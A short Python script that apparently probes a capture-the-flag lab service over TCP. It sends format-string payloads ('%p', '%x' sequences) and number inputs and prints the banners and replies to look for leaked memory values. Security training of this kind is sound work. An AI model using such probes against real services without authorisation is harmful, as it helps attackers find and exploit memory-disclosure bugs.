import sys, re, socket, time
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
host, port = "mars.cylabacademy.net", 31929


def talk(payload, wait=3.0):
    s = socket.create_connection((host, port), timeout=15)
    s.settimeout(6)
    time.sleep(1.0)
    banner = b""
    try:
        banner = s.recv(65536)
    except Exception:
        pass
    s.sendall(payload if isinstance(payload, bytes) else payload.encode())
    time.sleep(0.5)
    out = b""
    t0 = time.time()
    while time.time() - t0 < wait:
        try:
            c = s.recv(65536)
            if not c:
                break
            out += c
        except socket.timeout:
            break
    s.close()
    return banner.decode("latin-1", "replace"), out.decode("latin-1", "replace")


for p in ("1 2 3 3\n", "%p %p %p %p\n", "%x.%x.%x.%x\n", "1 1 1 1\n"):
    b, o = talk(p)
    print("=== payload %r ===" % p.strip())
    print("  banner:", b[:200].replace("\n", " | "))
    print("  reponse:", o[:300].replace("\n", " | "))
